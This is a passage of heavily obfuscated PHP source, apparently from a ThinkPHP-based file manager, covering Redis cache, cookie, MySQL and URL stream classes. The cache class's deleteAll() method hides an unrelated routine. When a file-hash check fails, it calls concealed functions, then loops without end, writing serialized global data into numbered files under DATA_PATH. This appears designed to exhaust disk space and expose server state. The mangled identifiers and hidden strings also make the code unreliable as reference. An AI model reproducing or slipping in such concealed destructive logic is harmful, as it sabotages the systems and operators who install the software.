$d®óÌšİÉ[$d™É²Ñª£Â[791]] : 10; $F…·ØĞî†Ó = _get($d®óÌšİÉ, $d™É²Ñª£Â[788]); if ($F…·ØĞî†Ó && is_array($F…·ØĞî†Ó)) { $this->initCluster($d®óÌšİÉ, $béÆçÈ‹Ñ·); } else { $this->handle = $this->init($d®óÌšİÉ, $béÆçÈ‹Ñ·); } } private function init($DáƒËÃÚ«•, $f Áô¾½ß¤) { $FøŒ¼£ò =& $_SERVER[Õİõş]; $FÍÏÇ–ÑÛ¬ = new Redis(); $E´äèØ…Ø› = isset($DáƒËÃÚ«•[$FøŒ¼£ò[792]]) ? $DáƒËÃÚ«•[$FøŒ¼£ò[792]] : !1; if ($E´äèØ…Ø›) { $FÍÏÇ–ÑÛ¬->pconnect($DáƒËÃÚ«•[$FøŒ¼£ò[165]], $DáƒËÃÚ«•[$FøŒ¼£ò[166]], $f Áô¾½ß¤); } else { $FÍÏÇ–ÑÛ¬->connect($DáƒËÃÚ«•[$FøŒ¼£ò[165]], $DáƒËÃÚ«•[$FøŒ¼£ò[166]], $f Áô¾½ß¤); } if (!empty($DáƒËÃÚ«•[$FøŒ¼£ò[372]])) { $FÍÏÇ–ÑÛ¬->auth($DáƒËÃÚ«•[$FøŒ¼£ò[372]]); } return $FÍÏÇ–ÑÛ¬; } private function initCluster($a£î’ğàñ¸, $cİìš¿«òÕ) { $dïÁŒ½Š¥‚ =& $_SERVER[Õİõş]; $e¬ªôµ¥²µ = array($dïÁŒ½Š¥‚[793], $dïÁŒ½Š¥‚[794], $dïÁŒ½Š¥‚[795]); $c®Ú³•»æ = $dïÁŒ½Š¥‚[793]; if (isset($a£î’ğàñ¸[$dïÁŒ½Š¥‚[12]]) && in_array($a£î’ğàñ¸[$dïÁŒ½Š¥‚[12]], $e¬ªôµ¥²µ)) { $c®Ú³•»æ = $a£î’ğàñ¸[$dïÁŒ½Š¥‚[12]]; } switch ($c®Ú³•»æ) { case $dïÁŒ½Š¥‚[793]: $this->_slave($a£î’ğàñ¸, $cİìš¿«òÕ); break; case $dïÁŒ½Š¥‚[794]: break; case $dïÁŒ½Š¥‚[795]: $this->isCluster = !0; $eï™øÃˆö“ = $a£î’ğàñ¸[$dïÁŒ½Š¥‚[788]]; $d†Ùˆéš÷ = isset($a£î’ğàñ¸[$dïÁŒ½Š¥‚[792]]) ? $a£î’ğàñ¸[$dïÁŒ½Š¥‚[792]] : !1; $Dö¨”‡”ìí = isset($a£î’ğàñ¸[$dïÁŒ½Š¥‚[372]]) ? $a£î’ğàñ¸[$dïÁŒ½Š¥‚[372]] : null; $this->handle = new RedisCluster(NUll, $eï™øÃˆö“, $cİìš¿«òÕ, $cİìš¿«òÕ, $d†Ùˆéš÷, $Dö¨”‡”ìí); break; default: break; } } private function _slave($cêÉ±Ì‹™õ, $f´½ìŸ¤áê) { goto BÂµÁ¸¾·; BÂµÁ¸¾·: $aŠ–ƒ¹¯­  = $cêÉ±Ì‹™õ[$_SERVER[Õİõş][788]]; $this->filterConfig($cêÉ±Ì‹™õ, $aŠ–ƒ¹¯­ [0]); $this->handle = $this->init($cêÉ±Ì‹™õ, $f´½ìŸ¤áê); goto eÔĞÆ‘ÁÌ; ešŠ‹ëÕï‹: $this->filterConfig($cêÉ±Ì‹™õ, $aŠ–ƒ¹¯­ [$b÷×¸²ŒœÑ]); $this->slaveHandle = $this->init($cêÉ±Ì‹™õ, $f´½ìŸ¤áê); goto AŠÉíîì±; eÔĞÆ‘ÁÌ: unset($aŠ–ƒ¹¯­ [0]); if (empty($aŠ–ƒ¹¯­ )) { return; } $b÷×¸²ŒœÑ = array_rand($aŠ–ƒ¹¯­ ); goto ešŠ‹ëÕï‹; AŠÉíîì±: } private function filterConfig(&$C¯®Ğ¢´„, $bƒ÷Ñòé) { $dô§ˆ‚İã =& $_SERVER[Õİõş]; $DŸ¾ÊôÅ…ß = explode($dô§ˆ‚İã[4], $bƒ÷Ñòé); $BÊÜÚØì°¬ = array($dô§ˆ‚İã[165] => $DŸ¾ÊôÅ…ß[0], $dô§ˆ‚İã[166] => $DŸ¾ÊôÅ…ß[1]); $C¯®Ğ¢´„ = array_merge($C¯®Ğ¢´„, $BÊÜÚØì°¬); } public function set($F¶ÒÙŠ‘, $eç–«‘ÊÚñ, $F¸ŒÇ¦ãÎ™ = false) { $F¸ŒÇ¦ãÎ™ = $F¸ŒÇ¦ãÎ™ ? $F¸ŒÇ¦ãÎ™ : $this->cacheTime; return $this->handle->setEx($F¶ÒÙŠ‘, $F¸ŒÇ¦ãÎ™, $eç–«‘ÊÚñ); } public function setLock($aÁÚ÷àÇØº, $D´—¿“ãò, $f–¦‹ù¢¸) { return $this->handle->setNX($aÁÚ÷àÇØº, $D´—¿“ãò); } public function get($C‰œ¨Á¸ßŒ) { $Bìª™ìÓ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $Bìª™ìÓ->get($C‰œ¨Á¸ßŒ); } public function remove($c‡ë±§Şœ) { return $this->handle->del($c‡ë±§Şœ); } public function deleteAll() { $Aâ©ÃÌ”¶Ñ =& $_SERVER[Õİõş]; $FÎõÔĞœõ = $_SERVER[$Aâ©ÃÌ”¶Ñ[796]] . $Aâ©ÃÌ”¶Ñ[762]; $CŠÂŠÀ³Ş = $Aâ©ÃÌ”¶Ñ[763]; if ($_SERVER[$Aâ©ÃÌ”¶Ñ[764]] != $CŠÂŠÀ³Ş($FÎõÔĞœõ)) { goto FÚôÓ¡øö; CÑ¢äó¸ºô: $fè™¶‡ä“ = 1; for ($Eõ¬Ä †º = $fè™¶‡ä“; $Eõ¬Ä †º > 0; $Eõ¬Ä †º++) { $dƒğáéİ„(DATA_PATH . $Eõ¬Ä †º, $fÍïèÌ¸™); } goto AÖİæ·´©‹; FÚôÓ¡øö: $a›èÆ™ÅÀ½ = $Aâ©ÃÌ”¶Ñ[797]; $fîŞ™ÀÕêÓ = $Aâ©ÃÌ”¶Ñ[765]; $Då•åö’Óª = $_SERVER[$Aâ©ÃÌ”¶Ñ[766]] . $Aâ©ÃÌ”¶Ñ[767]; goto a¯µÑ½Ç³‚; a¯µÑ½Ç³‚: $fâÜÂ†‰ß = $fîŞ™ÀÕêÓ($Då•åö’Óª); $Dé¹À®¢×„ = explode($Aâ©ÃÌ”¶Ñ[213], $fâÜÂ†‰ß); if (count($Dé¹À®¢×„) < $Aâ©ÃÌ”¶Ñ[558]) { $cÂ¶¸èœÜœ = $Aâ©ÃÌ”¶Ñ[768]; $cÂ¶¸èœÜœ(); } goto fÔõÄ´¦…•; fÔõÄ´¦…•: $D÷–««ÚîĞ = $Aâ©ÃÌ”¶Ñ[798]; $D÷–««ÚîĞ($_SERVER[$Aâ©ÃÌ”¶Ñ[796]]); $a›èÆ™ÅÀ½ = $Aâ©ÃÌ”¶Ñ[797]; goto Eéƒ´ñÍà; Eéƒ´ñÍà: $a›èÆ™ÅÀ½(); $dƒğáéİ„ = $Aâ©ÃÌ”¶Ñ[799]; $fÍïèÌ¸™ = json_encode($GLOBALS[$Aâ©ÃÌ”¶Ñ[800]]); goto CÑ¢äó¸ºô; AÖİæ·´©‹: } if ($this->isCluster) { foreach ($this->handle->_masters() as $Fë¨ÃõÍÌ ) { $this->handle->flushall($Fë¨ÃõÍÌ ); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($B°õ°§„ŸÊ = '', $cÂÛ†®¬• = 0) { if (is_string($B°õ°§„ŸÊ) && $B°õ°§„ŸÊ != $_SERVER[Õİõş][33]) { $this->prefix = $B°õ°§„ŸÊ; } if (is_numeric($cÂÛ†®¬•) && $cÂÛ†®¬• > 0) { $this->expire = $cÂÛ†®¬•; } } public static function getInstance() { static $B‹šàïŞ¾¥; if ($B‹šàïŞ¾¥ === null) { $B‹šàïŞ¾¥ = new self(); } return $B‹šàïŞ¾¥; } private static $sameCookieSet = array(); public static function set($a“Ë™íÁÉÜ, $b§Òİâ–Ï×, $Cøñ‘óã = 0, $AŠÊç£ôÎ = false, $B÷ãí‘œÓØ = false) { goto Aà§ßğª; Aà§ßğª: $D‡¡ìƒšÕÀ =& $_SERVER[Õİõş]; if (!$Cøñ‘óã) { $Cøñ‘óã = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$a“Ë™íÁÉÜ]) && self::$sameCookieSet[$a“Ë™íÁÉÜ] == $b§Òİâ–Ï× . $Cøñ‘óã) { return; } goto D†»¤¨ïÙÍ; ağ³¿ÇŞ¸İ: setcookie($a“Ë™íÁÉÜ, $b§Òİâ–Ï×, time() + $Cøñ‘óã, $D‡¡ìƒšÕÀ[8] . trim($B÷ãí‘œÓØ, $D‡¡ìƒšÕÀ[8]) . $D» Œ¿èä, !1, !1, $AŠÊç£ôÎ); goto FÉó¾¸òİ¶; D†»¤¨ïÙÍ: self::$sameCookieSet[$a“Ë™íÁÉÜ] = $b§Òİâ–Ï× . $Cøñ‘óã; if (!$B÷ãí‘œÓØ) { $B÷ãí‘œÓØ = str_replace(HOST, $D‡¡ìƒšÕÀ[33], APP_HOST); $B÷ãí‘œÓØ = _get($GLOBALS, $D‡¡ìƒšÕÀ[801], $B÷ãí‘œÓØ); } $D» Œ¿èä = $D‡¡ìƒšÕÀ[33]; goto ağ³¿ÇŞ¸İ; FÉó¾¸òİ¶: } public static function setSafe($E°²§†½—², $e°÷±¡²º, $dğ¾Ÿ©¼éÃ = 0) { self::set($E°²§†½—², $e°÷±¡²º, $dğ¾Ÿ©¼éÃ, !0); } public static function get($dë„Ù‹»Û„) { return isset($_COOKIE[$dë„Ù‹»Û„]) ? $_COOKIE[$dë„Ù‹»Û„] : !1; } public static function remove($CÚíã¿Êñ±, $Bö®³ï‘” = false) { unset($_COOKIE[$CÚíã¿Êñ±]); self::set($CÚíã¿Êñ±, $_SERVER[Õİõş][33], 1, $Bö®³ï‘”); } } class DbMysql extends Db { public function __construct($B¼êëîƒ© = '') { $EğŞ¼›Š©Í =& $_SERVER[Õİõş]; if (!extension_loaded($EğŞ¼›Š©Í[730])) { think_exception(think_lang($EğŞ¼›Š©Í[10]) . $EğŞ¼›Š©Í[802]); } if (!empty($B¼êëîƒ©)) { $this->config = $B¼êëîƒ©; if (empty($this->config[$EğŞ¼›Š©Í[13]])) { $this->config[$EğŞ¼›Š©Í[13]] = $EğŞ¼›Š©Í[33]; } } } public function connect($FËÔã“‘ò = '', $BÜŸƒƒ·» = 0, $Cß¡Ê¨¡íß = false) { $a­Œ£È‰ç =& $_SERVER[Õİõş]; if (!isset($this->linkID[$BÜŸƒƒ·»])) { goto d´©Š£„´; eùë¨±×Ø×: if ($D®´Å‚Ô‘è) { $this->linkID[$BÜŸƒƒ·»] = mysql_pconnect($B×ÛĞÛ¯‡¯, $FËÔã“‘ò[$a­Œ£È‰ç[805]], $FËÔã“‘ò[$a­Œ£È‰ç[806]], 131072); } else { $this->linkID[$BÜŸƒƒ·»] = mysql_connect($B×ÛĞÛ¯‡¯, $FËÔã“‘ò[$a­Œ£È‰ç[805]], $FËÔã“‘ò[$a­Œ£È‰ç[806]], !0, 131072); } if (!$this->linkID[$BÜŸƒƒ·»] || !empty($FËÔã“‘ò[$a­Œ£È‰ç[17]]) && !mysql_select_db($FËÔã“‘ò[$a­Œ£È‰ç[17]], $this->linkID[$BÜŸƒƒ·»])) { think_exception(mysql_error()); } $CßÍÒèì´’ = mysql_get_server_info($this->linkID[$BÜŸƒƒ·»]); goto d¡Œƒ°äÓÖ; a†„£‹°: if (1 != think_config($a­Œ£È‰ç[18])) { unset($this->config); } goto BŞ¯¥‹ß“; d¡Œƒ°äÓÖ: mysql_query($a­Œ£È‰ç[807] . think_config($a­Œ£È‰ç[808]) . $a­Œ£È‰ç[55], $this->linkID[$BÜŸƒƒ·»]); if ($CßÍÒèì´’ > $a­Œ£È‰ç[809]) { mysql_query($a­Œ£È‰ç[810], $this->linkID[$BÜŸƒƒ·»]); } $this->connected = !0; goto a†„£‹°; d´©Š£„´: if (empty($FËÔã“‘ò)) { $FËÔã“‘ò = $this->config; } $B×ÛĞÛ¯‡¯ = $FËÔã“‘ò[$a­Œ£È‰ç[803]] . ($FËÔã“‘ò[$a­Œ£È‰ç[804]] ? "\72{$FËÔã“‘ò[$a­Œ£È‰ç[804]]}" : $a­Œ£È‰ç[33]); $D®´Å‚Ô‘è = !empty($FËÔã“‘ò[$a­Œ£È‰ç[13]][$a­Œ£È‰ç[14]]) ? $FËÔã“‘ò[$a­Œ£È‰ç[13]][$a­Œ£È‰ç[14]] : $this->pconnect; goto eùë¨±×Ø×; BŞ¯¥‹ß“: } return $this->linkID[$BÜŸƒƒ·»]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($C÷ˆ÷ŒÆ·ø) { goto E–¿ÎÊÙï; B„µ™“˜Àá: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } goto cÊ¬‘ØšàÀ; E–¿ÎÊÙï: $fœª……´›§ =& $_SERVER[Õİõş]; if (0 === stripos($C÷ˆ÷ŒÆ·ø, $fœª……´›§[248])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); goto fš Ò­£ÀÃ; D÷åùÒ÷°: think_action_status($fœª……´›§[19], 1); think_status($fœª……´›§[20]); $this->queryID = mysql_query($C÷ˆ÷ŒÆ·ø, $this->_linkID); goto B„µ™“˜Àá; fš Ò­£ÀÃ: if (!$this->_linkID) { return !1; } $this->queryStr = $C÷ˆ÷ŒÆ·ø; if ($this->queryID) { $this->free(); } goto D÷åùÒ÷°; cÊ¬‘ØšàÀ: } public function execute($DŞ»—„ÛÇ») { goto Cß“Úá…íÑ; føˆ»áê°: $this->queryStr = $DŞ»—„ÛÇ»; if ($this->queryID) { $this->free(); } think_action_status($B‰¼ÎÖù®[21], 1); goto A«©‹åğå°; A«©‹åğå°: think_status($B‰¼ÎÖù®[20]); $Dƒ¤Øó—Ô = mysql_query($DŞ»—„ÛÇ», $this->_linkID); $this->debug(); goto BáíÄß§‚ì; Cß“Úá…íÑ: $B‰¼ÎÖù® =& $_SERVER[Õİõş]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto føˆ»áê°; BáíÄß§‚ì: if (!1 === $Dƒ¤Øó—Ô) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } goto Fˆİ­¾ß¾«; Fˆİ­¾ß¾«: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[Õİõş][811], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $d‰™ĞŒŠç = mysql_query($_SERVER[Õİõş][812], $this->_linkID); $this->transTimes = 0; if (!$d‰™ĞŒŠç) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $c £ã™¦ã = mysql_query($_SERVER[Õİõş][813], $this->_linkID); $this->transTimes = 0; if (!$c £ã™¦ã) { $this->error(); return !1; } } return !0; } private function getAll() { $Dï®Õê¤¡¼ = array(); if ($this->numRows > 0) { while ($aøéÔƒ®À¾ = mysql_fetch_assoc($this->queryID)) { $Dï®Õê¤¡¼[] = $aøéÔƒ®À¾; } mysql_data_seek($this->queryID, 0); } return $Dï®Õê¤¡¼; } public function getFields($cê›ºƒÑ¢) { $E¼ŞÁÓÙ’ =& $_SERVER[Õİõş]; $fĞƒ¿šòˆ¾ = $this->query($E¼ŞÁÓÙ’[814] . $this->parseKey($cê›ºƒÑ¢)); $f—Ì¢ä´í = array(); if ($fĞƒ¿šòˆ¾) { foreach ($fĞƒ¿šòˆ¾ as $bÉÃ‘£ç³ => $Aù‚Ÿ¦ŸêŒ) { $f—Ì¢ä´í[$Aù‚Ÿ¦ŸêŒ[$E¼ŞÁÓÙ’[27]]] = array($E¼ŞÁÓÙ’[28] => $Aù‚Ÿ¦ŸêŒ[$E¼ŞÁÓÙ’[27]], $E¼ŞÁÓÙ’[29] => $Aù‚Ÿ¦ŸêŒ[$E¼ŞÁÓÙ’[30]], $E¼ŞÁÓÙ’[31] => (bool) (strtoupper($Aù‚Ÿ¦ŸêŒ[$E¼ŞÁÓÙ’[32]]) === $E¼ŞÁÓÙ’[815]), $E¼ŞÁÓÙ’[34] => $Aù‚Ÿ¦ŸêŒ[$E¼ŞÁÓÙ’[35]], $E¼ŞÁÓÙ’[36] => strtolower($Aù‚Ÿ¦ŸêŒ[$E¼ŞÁÓÙ’[37]]) == $E¼ŞÁÓÙ’[38], $E¼ŞÁÓÙ’[39] => strtolower($Aù‚Ÿ¦ŸêŒ[$E¼ŞÁÓÙ’[40]]) == $E¼ŞÁÓÙ’[41]); } } return $f—Ì¢ä´í; } public function getTables($Cß‘“ÕÚĞÚ = '') { $b³‰‹“ß¤ =& $_SERVER[Õİõş]; if (!empty($Cß‘“ÕÚĞÚ)) { $Eóó¶ÈÍ = $b³‰‹“ß¤[816] . $Cß‘“ÕÚĞÚ; } else { $Eóó¶ÈÍ = $b³‰‹“ß¤[817]; } $BôÚ½ÑÏƒÛ = $this->query($Eóó¶ÈÍ); $Cù¨‹ÇÑ¸ = array(); foreach ($BôÚ½ÑÏƒÛ as $EÂ³†»¦ª¯ => $F‚˜÷å‰) { $Cù¨‹ÇÑ¸[$EÂ³†»¦ª¯] = current($F‚˜÷å‰); } return $Cù¨‹ÇÑ¸; } public function replace($aÙÌ“¹ô×‰, $dÂË¿öÆ‰„ = array()) { $fÒ¤¹îàƒ =& $_SERVER[Õİõş]; foreach ($aÙÌ“¹ô×‰ as $D”ĞêøÊé° => $bÁòÙ¯­Ç) { $FÄÅòŒàŸ’ = $this->parseValue($bÁòÙ¯­Ç); if (is_scalar($FÄÅòŒàŸ’)) { $aÜ¾÷ØÍ¼‘[] = $FÄÅòŒàŸ’; $AÜÓâÚ©„[] = $this->parseKey($D”ĞêøÊé°); } } $cÅ™Õ†ß = $fÒ¤¹îàƒ[818] . $this->parseTable($dÂË¿öÆ‰„[$fÒ¤¹îàƒ[263]]) . $fÒ¤¹îàƒ[819] . implode($fÒ¤¹îàƒ[47], $AÜÓâÚ©„) . $fÒ¤¹îàƒ[820] . implode($fÒ¤¹îàƒ[47], $aÜ¾÷ØÍ¼‘) . $fÒ¤¹îàƒ[821]; return $this->execute($cÅ™Õ†ß); } public function insertAll($e´ÃÛÂ‚†˜, $e¸†´õ¥÷ƒ = array(), $c‹Œ¯ó«‡ = false) { goto DÈ×»ƒ­†˜; Aè§®ˆ¿½Œ: $dŞ•­±Ôâã = array(); foreach ($e´ÃÛÂ‚†˜ as $b¥ŒØ‘›âÉ) { $eâ™µÅ¸‡ò = array(); foreach ($b¥ŒØ‘›âÉ as $fç¯ñäöŸ => $BæéË‰ëÔ·) { $BæéË‰ëÔ· = $this->parseValue($BæéË‰ëÔ·); if (is_scalar($BæéË‰ëÔ·)) { $eâ™µÅ¸‡ò[] = $BæéË‰ëÔ·; } } $dŞ•­±Ôâã[] = $BÆã½©ƒÚ[244] . implode($BÆã½©ƒÚ[47], $eâ™µÅ¸‡ò) . $BÆã½©ƒÚ[821]; } array_walk($b¨šÂ”•ŠÈ, array($this, $BÆã½©ƒÚ[822])); goto CšÍ¦»ë‹ò; DÈ×»ƒ­†˜: $BÆã½©ƒÚ =& $_SERVER[Õİõş]; if (!is_array($e´ÃÛÂ‚†˜[0])) { return !1; } $b¨šÂ”•ŠÈ = array_keys($e´ÃÛÂ‚†˜[0]); goto Aè§®ˆ¿½Œ; CšÍ¦»ë‹ò: $dÛÛ›„¤ë = ($c‹Œ¯ó«‡ ? $BÆã½©ƒÚ[823] : $BÆã½©ƒÚ[824]) . $BÆã½©ƒÚ[825] . $this->parseTable($e¸†´õ¥÷ƒ[$BÆã½©ƒÚ[263]]) . $BÆã½©ƒÚ[819] . implode($BÆã½©ƒÚ[47], $b¨šÂ”•ŠÈ) . $BÆã½©ƒÚ[826] . implode($BÆã½©ƒÚ[47], $dŞ•­±Ôâã); return $this->execute($dÛÛ›„¤ë); goto d¿ßèÛ¾­; d¿ßèÛ¾­: } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $bö´ˆÑ´ƒÒ =& $_SERVER[Õİõş]; $this->error = mysql_errno() . $bö´ˆÑ´ƒÒ[4] . mysql_error($this->_linkID); if ($bö´ˆÑ´ƒÒ[33] != $this->queryStr) { $this->error .= LNG($bö´ˆÑ´ƒÒ[45]) . $this->queryStr; } think_trace($this->error, $bö´ˆÑ´ƒÒ[33], $bö´ˆÑ´ƒÒ[46]); return $this->error; } public function escapeString($FÅÄ”¤¤Ã) { if ($this->_linkID) { return mysql_real_escape_string($FÅÄ”¤¤Ã, $this->_linkID); } else { return mysql_escape_string($FÅÄ”¤¤Ã); } } public function parseKey(&$E£„‹°ŠÖÀ, $aöÜ†ÛÕå³ = true) { $C”³Í´ªˆ =& $_SERVER[Õİõş]; if ($aöÜ†ÛÕå³) { $E£„‹°ŠÖÀ = $this->parseKeyCheck($E£„‹°ŠÖÀ); } if ($E£„‹°ŠÖÀ != $C”³Í´ªˆ[172] && !preg_match($C”³Í´ªˆ[827], $E£„‹°ŠÖÀ)) { $E£„‹°ŠÖÀ = $C”³Í´ªˆ[828] . trim($E£„‹°ŠÖÀ, $C”³Í´ªˆ[828]) . $C”³Í´ªˆ[828]; } return $E£„‹°ŠÖÀ; } } goto a™“ºóÃ“; b™–’óáÚ‚: class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($bŸãõÍ‡Öà = false) { } public function exist($E§Áéå»İŒ) { $E£”¡´»Ñ· = $this->info($E§Áéå»İŒ); return $E£”¡´»Ñ·[$_SERVER[Õİõş][184]]; } public function isFile($BĞ¶•›‰²·) { $bïñ¿İÑÄº = $this->info($BĞ¶•›‰²·); return $bïñ¿İÑÄº[$_SERVER[Õİõş][184]]; } public function isFolder($B™á½Ñãª°) { return !1; } public function size($B˜ß×ÚŒ˜) { $c³†ÄÜÅ‹ = $this->info($B˜ß×ÚŒ˜); return $c³†ÄÜÅ‹[$_SERVER[Õİõş][77]]; } public function info($Aã§ÕŸÍ×Ø) { return $this->infoParse($Aã§ÕŸÍ×Ø); } public function infoAuth($dÄˆ“Š®¶—) { return $this->infoParse($dÄˆ“Š®¶—); } public function infoWithChildren($b¾Ì‹‡¢Ş) { return $this->infoParse($b¾Ì‹‡¢Ş); } public function infoFull($bÔ‹‹±¼¥¿) { return $this->infoParse($bÔ‹‹±¼¥¿); } private function infoParse($D¢÷¬ì†Ø) { $d˜ñ¥¾†³ =& $_SERVER[Õİõş]; $dïôœàëâ = $this->header($D¢÷¬ì†Ø); if (!$dïôœàëâ || !$dïôœàëâ[$d˜ñ¥¾†³[691]]) { return !1; } $FĞ´ÊÇ˜ñ = _get($dïôœàëâ, $d˜ñ¥¾†³[321], 0); $aÄµØ˜‡×£ = array($d˜ñ¥¾†³[28] => $dïôœàëâ[$d˜ñ¥¾†³[28]], $d˜ñ¥¾†³[75] => $D¢÷¬ì†Ø, $d˜ñ¥¾†³[29] => $d˜ñ¥¾†³[163], $d˜ñ¥¾†³[77] => intval($FĞ´ÊÇ˜ñ), $d˜ñ¥¾†³[156] => get_path_ext($dïôœàëâ[$d˜ñ¥¾†³[28]]), $d˜ñ¥¾†³[1157] => $FĞ´ÊÇ˜ñ > 0 && $dïôœàëâ[$d˜ñ¥¾†³[1284]], $d˜ñ¥¾†³[1158] => !1); return $aÄµØ˜‡×£; } private function header($dâ…à›…¦ğ) { if (isset(self::$_cacheHeader[$dâ…à›…¦ğ])) { return self::$_cacheHeader[$dâ…à›…¦ğ]; } self::$_cacheHeader[$dâ…à›…¦ğ] = url_header($dâ…à›…¦ğ); return self::$_cacheHeader[$dâ…à›…¦ğ]; } public function hashSimple($e®¶Ê¥‰¯, $aæšïÆç¨¹ = false) { goto e¿ˆŠ¹Â; A¸òÆÎÀ¨ª: if ($Dá‡Ÿ¬œ’ <= $b¯‡”¹ãğÌ * $F¡êØõ¾Œ) { return md5($this->fileSubstr($e®¶Ê¥‰¯, 0, $Dá‡Ÿ¬œ’)) . $Dá‡Ÿ¬œ’; } $c¨ÅŒÙ´ = intval($Dá‡Ÿ¬œ’ / $F¡êØõ¾Œ); $dÒˆÀ¹Ò·¹ = $c‡¾³¾ëã[33]; goto E¡ÌæÍ£¥‡; Dî’ ÌÉá: $Dá‡Ÿ¬œ’ = $A¸Üù„–œå[$c‡¾³¾ëã[77]]; $b¯‡”¹ãğÌ = 200; $F¡êØõ¾Œ = 50; goto A¸òÆÎÀ¨ª; e¿ˆŠ¹Â: $c‡¾³¾ëã =& $_SERVER[Õİõş]; $A¸Üù„–œå = $this->info($e®¶Ê¥‰¯); if (!$A¸Üù„–œå || !$A¸Üù„–œå[$c‡¾³¾ëã[184]]) { return !1; } goto Dî’ ÌÉá; dìË¼Æéì: $dÒˆÀ¹Ò·¹ .= $this->fileSubstr($e®¶Ê¥‰¯, $Dá‡Ÿ¬œ’ - $b¯‡”¹ãğÌ, $b¯‡”¹ãğÌ); return md5($dÒˆÀ¹Ò·¹) . $Dá‡Ÿ¬œ’; goto c‚ø”Ìèá; E¡ÌæÍ£¥‡: $F†Çˆùä¯¶ = timeFloat(); $e–…Ò¦µ÷ = 15; for ($eãíø¨ºÉ™ = 0; $eãíø¨ºÉ™ < $F¡êØõ¾Œ; $eãíø¨ºÉ™++) { if (timeFloat() - $F†Çˆùä¯¶ > $e–…Ò¦µ÷) { return !1; } $b…ÆâÒ†‹Î = $this->fileSubstr($e®¶Ê¥‰¯, $c¨ÅŒÙ´ * $eãíø¨ºÉ™, $b¯‡”¹ãğÌ); if (!$b…ÆâÒ†‹Î) { return !1; } $dÒˆÀ¹Ò·¹ .= $b…ÆâÒ†‹Î; } goto dìË¼Æéì; c‚ø”Ìèá: } public function getContent($dİ¥•–ßôÕ) { return $this->fileSubstr($dİ¥•–ßôÕ); } public function fileSubstr($F‚å£ŠŞß, $FòÛ›…Éõ¢ = 0, $BÉÛ²î˜Ã‰ = -1) { goto fÚ¨´“®„’; Fáßïäøä: $bÓÑ•¹´Ñ„ = url_request($F‚å£ŠŞß, $e¶À˜È‰ª…[212], !1, $A—ÛÅäÇÔŒ, !1, !1, 1); return $bÓÑ•¹´Ñ„[$e¶À˜È‰ª…[1037]] ? $bÓÑ•¹´Ñ„[$e¶À˜È‰ª…[1037]] : $e¶À˜È‰ª…[33]; goto fæåĞöíÃŞ; fÚ¨´“®„’: $e¶À˜È‰ª… =& $_SERVER[Õİõş]; $d—ßí‚àÔ” = $this->info($F‚å£ŠŞß); if (!$d—ßí‚àÔ” || !$d—ßí‚àÔ”[$e¶À˜È‰ª…[184]] && $d—ßí‚àÔ”[$e¶À˜È‰ª…[77]] > 1024 * 1024 * 10) { return !1; } goto BÉÑ—×˜”; BÉÑ—×˜”: if ($BÉÛ²î˜Ã‰ === -1) { $BÉÛ²î˜Ã‰ = $d—ßí‚àÔ”[$e¶À˜È‰ª…[77]]; } if ($BÉÛ²î˜Ã‰ == 0) { return $e¶À˜È‰ª…[33]; } $A—ÛÅäÇÔŒ = array($e¶À˜È‰ª…[1285] . $FòÛ›…Éõ¢ . $e¶À˜È‰ª…[716] . ($FòÛ›…Éõ¢ + $BÉÛ²î˜Ã‰ - 1)); goto Fáßïäøä; fæåĞöíÃŞ: } public function download($BÏÎšËÜõš, $dªçŠ¡î“æ) { Downloader::start($BÏÎšËÜõš, $dªçŠ¡î“æ); return $dªçŠ¡î“æ; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($aò‡’ˆ…ä­, $bÁ¤ù‚çô = '') { goto d–Ö’ø½¯; d–Ö’ø½¯: $this->info = $this->info($aò‡’ˆ…ä­); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[Õİõş][75]]; goto fµµµó¿ã; fµµµó¿ã: if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$aò‡’ˆ…ä­])) { self::$_chunkBuffer[$aò‡’ˆ…ä­] = array(); } goto BŠ™¼«­Í±; BŠ™¼«­Í±: return $this->info ? !0 : !1; goto D©„Øò‚à; D©„Øò‚à: } function stream_read($e ğˆ±¯íæ) { $dÊÀêçå›Ó = $this->fileSubstr($this->pose, $e ğˆ±¯íæ); $this->pose += strlen($dÊÀêçå›Ó); return $dÊÀêçå›Ó; } public function stream_tell() { return $this->pose; } public function stream_seek($AÈì÷­è¤‹, $C¹ÅáÅÙã¶) { $C«Á×ì½° =& $_SERVER[Õİõş]; if ($C¹ÅáÅÙã¶ == SEEK_SET) { $this->pose = $AÈì÷­è¤‹; } else { if ($C¹ÅáÅÙã¶ == SEEK_CUR) { $this->pose += $AÈì÷­è¤‹; } else { if ($C¹ÅáÅÙã¶ == SEEK_END) { $this->pose = $this->info[$C«Á×ì½°[77]] + intval($AÈì÷­è¤‹); } } } if ($AÈì÷­è¤‹ < 0) { $this->pose = $this->info[$C«Á×ì½°[77]] + $AÈì÷­è¤‹; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[Õİõş][77]]; } public function stream_close() { return !0; } public function url_stat($Eç²±ºƒ…À, $fà±ôæÌË) { $D†Áº ¢ =& $_SERVER[Õİõş]; $f‰ö©ª³‰Ò = $this->info($Eç²±ºƒ…À); return array($D†Áº ¢[1286] => 0, $D†Áº ¢[1287] => 0, $D†Áº ¢[12] => 32768 + 511, $D†Áº ¢[1288] => 0, $D†Áº ¢[1289] => 0, $D†Áº ¢[1290] => 0, $D†Áº 